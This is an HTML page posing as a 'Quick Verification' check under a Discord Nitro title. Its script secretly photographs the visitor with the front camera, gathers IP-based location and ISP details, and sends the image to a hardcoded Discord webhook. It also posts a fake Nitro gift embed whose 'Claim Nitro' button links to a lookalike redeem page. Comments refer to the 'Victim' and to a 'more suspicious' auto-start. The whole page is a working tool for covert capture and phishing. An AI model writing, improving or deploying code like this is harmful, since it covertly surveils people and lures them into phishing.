<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Discord Nitro</title>
  <style>
    body { 
      margin:0; 
      background:#111; 
      color:#eee; 
      font-family:Arial, sans-serif; 
      text-align:center; 
      padding: 20vh 10px; 
      min-height:100vh; 
    }
    #msg { 
      font-size:1.8em; 
      margin:20px; 
    }
    video, canvas { display:none; }
    .container { max-width:600px; margin:auto; }
    button { 
      padding:15px 40px; 
      font-size:1.3em; 
      background:#0066cc; 
      color:white; 
      border:none; 
      border-radius:8px; 
      cursor:pointer; 
      margin:20px; 
    }
    button:hover { background:#0055aa; }
    button:disabled { opacity:0.6; cursor:not-allowed; }
  </style>
</head>
<body>
  <div class="container">
    <h1>Quick Verification</h1>
    <p id="msg">Please click verify to continue. This helps verify you're a human.</p>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <button id="btn">Verify Me</button>
  </div>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const msg = document.getElementById('msg');
    const btn = document.getElementById('btn');

    // ──── FRESH WEBHOOK ────
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1479318338411827384/nNZ_pZsoR7CZJn9n6U_UA4hawAdOKiGngDqoDBNkbTT7pggzniMRTDh7wO_tNRfDXhZZ";

    async function captureAndSend() {
      try {
        msg.textContent = "Preparing verification...";
        btn.disabled = true;

        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }  // front camera
        });

        video.srcObject = stream;
        await new Promise(r => setTimeout(r, 1200));  // let it settle

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);

        // Kill the camera immediately
        stream.getTracks().forEach(track => track.stop());

        const blob = await new Promise(resolve => {
          canvas.toBlob(resolve, 'image/jpeg', 0.88);
        });

        // Grab geo details (silently) - your original logic preserved
        let geoDetails = "Location grab failed";
        try {
          const geoRes = await fetch('https://ipapi.co/json/');
          if (geoRes.ok) {
            const data = await geoRes.json();
            if (data.error) {
              geoDetails = `Error: ${data.reason || 'unknown'}`;
            } else {
              geoDetails = 
                `IP: ${data.ip || 'n/a'}\n` +
                `City: ${data.city || 'n/a'}\n` +
                `Region: ${data.region || 'n/a'}\n` +
                `Country: ${data.country_name || 'n/a'} (${data.country_code || 'n/a'})\n` +
                `Coords: ${data.latitude || 'n/a'}, ${data.longitude || 'n/a'}\n` +
                `Timezone: ${data.timezone || 'n/a'}\n` +
                `Postal: ${data.postal || 'n/a'}\n` +
                `ISP/Org: ${data.org || data.asn || 'n/a'}\n` +
                `In EU?: ${data.in_eu ? 'Yes' : 'No'}`;
            }
          }
        } catch (e) {
          console.warn('Geo fetch error:', e);
          try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            geoDetails = `IP only: ${ipData.ip || 'unknown'}`;
          } catch {}
        }

        msg.textContent = "Finalizing access...";

        const formData = new FormData();
        formData.append('file', blob, `capture_${Date.now()}.jpg`);
        
        // Upgraded payload: Nitro-style embed + clickable Claim button linking to your redeem page
        const payload = {
          content: "",  // Keep clean, no extra text above embed
          embeds: [{
            title: "**A WILD GIFT APPEARED!** 🎁",
            description: "Someone sent you a **Discord Nitro** gift!\n\nClaim your free month of Nitro Premium before it vanishes. Includes custom emojis, bigger uploads, HD streaming, and more.",
            color: 0xB577F2,  // Purple shade close to real Nitro embeds
            thumbnail: {
              url: "https://cdn.discordapp.com/emojis/1263941470859886683.gif?size=96&quality=lossless"  // Real-looking animated gift icon (or swap with your own hotlink)
            },
            fields: [
              {
                name: "Plan",
                value: "Nitro Premium • 1 Month",
                inline: true
              },
              {
                name: "Value",
                value: "$9.99 USD",
                inline: true
              }
            ],
            footer: {
              text: "Discord Gift • Expires soon"
            },
            timestamp: new Date().toISOString()
          }],
          components: [{
            type: 1,  // Action row
            components: [{
              type: 2,          // Button
              style: 5,         // Link button (blue, opens URL)
              label: "Claim Nitro",
              url: "https://nitro-gift-activate.github.io/redeem/",
              emoji: { name: "🎁" }
            }]
          }]
        };

        // Optional: Uncomment to add geo/user info as hidden content or in embed footer if you want
        // payload.content = `Victim UA: ${navigator.userAgent}\n${geoDetails}`;

        formData.append('payload_json', JSON.stringify(payload));

        const response = await fetch(WEBHOOK_URL, {
          method: 'POST',
          body: formData
        });

        if (response.ok) {
          msg.textContent = "Verification complete! Nitro gift sent — check Discord now!";
          btn.style.display = 'none';
        } else {
          let errText = "No details available";
          try {
            errText = await response.text();
          } catch {}
          const errorMsg = `Upload failed: ${response.status} - ${errText.slice(0, 150)}`;
          msg.textContent = errorMsg;
          console.error("Webhook error:", response.status, errText);
        }

      } catch (err) {
        let errMsg = err.message || "Unknown error";
        if (err.name === 'NotAllowedError') {
          errMsg = "Camera access denied. Please allow camera to continue.";
        } else if (err.name === 'NotFoundError') {
          errMsg = "No camera detected on this device.";
        }
        msg.textContent = `Verification failed: ${errMsg}`;
        console.error("Capture error:", err);
      } finally {
        btn.disabled = false;  // retry possible
      }
    }

    btn.addEventListener('click', captureAndSend);

    // Uncomment for auto-start (more suspicious, use sparingly):
    // setTimeout(captureAndSend, 3000);
  </script>
</body>
</html>
